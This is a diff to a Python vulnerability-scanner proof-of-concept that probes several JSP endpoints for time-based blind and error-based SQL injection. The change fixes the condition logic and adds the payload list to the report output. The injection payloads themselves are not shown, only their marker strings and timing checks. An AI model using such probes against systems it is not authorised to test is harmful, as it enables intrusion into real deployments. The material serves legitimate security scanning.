@@ -49,10 +49,10 @@ class Poc(ABPoc):
                 t2 = time.time()
                 code, head, res, errcode, _ = hh.http(url2)
                 t3 = time.time()
-                if code == 200 or code ==500 and 2*t2-t3-t1 > 3:
+                if (code == 200 or code ==500) and 2*t2-(t3+t1) > 3:
                     #security_hole(self.target + 'fenc/syncsubject.jsp?pk_corp=1' + "   :time-based blind")
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
+                        target=self.target, name=self.vuln.name, urls=payloads))
 
                     
             payloads = [
@@ -62,10 +62,10 @@ class Poc(ABPoc):
             for payload in payloads:
                 url = self.target + payload
                 code, head, res, errcode, _ = hh.http(url)
-                if code == 200 or code ==500 and 'qzvzqplkNCLDgvzqqzvq' in res or 'qqvvqoiDrKmjbCfqqvpq' in res :
+                if (code == 200 or code ==500 )and ('qzvzqplkNCLDgvzqqzvq' in res or 'qqvvqoiDrKmjbCfqqvpq' in res) :
                     #security_hole(self.target +'indexsearch/filter.jsp?tableId=1' + "   :sql Injection")
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
+                        target=self.target, name=self.vuln.name, urls=payloads))
 
             
             payloads = [
@@ -76,10 +76,10 @@ class Poc(ABPoc):
             for payload in payloads:
                 url = self.target + payload
                 code, head, res, errcode, _ = hh.http(url)
-                if code == 200 or code ==500 and 'qqpvq1qjbpq' in res or 'qkvqquRGucCQKQdqzkjq' in res :
+                if (code == 200 or code ==500) and ('qqpvq1qjbpq' in res or 'qkvqquRGucCQKQdqzkjq' in res) :
                     #security_hole(self.target + 'feReport/chartList.jsp?delId=1&reportId=1' + "   :sql Injection")
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
+                        target=self.target, name=self.vuln.name, urls=payloads))
                     
                     
             payloads = [
@@ -95,10 +95,10 @@ class Poc(ABPoc):
                 t2 = time.time()
                 code, head, res, errcode, _ = hh.http(url2)
                 t3 = time.time()
-                if code == 200 or code ==500 and 2*t2-t3-t1 > 3:
+                if (code == 200 or code ==500) and 2*t2-(t3+t1) > 3:
                     #security_hole(self.target + 'flex/newsmessage.jsp?uname=1' + "   :time-based blind")
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;urls={urls}'.format(
+                        target=self.target, name=self.vuln.name, urls=payloads))
                     
                 
         except Exception, e:
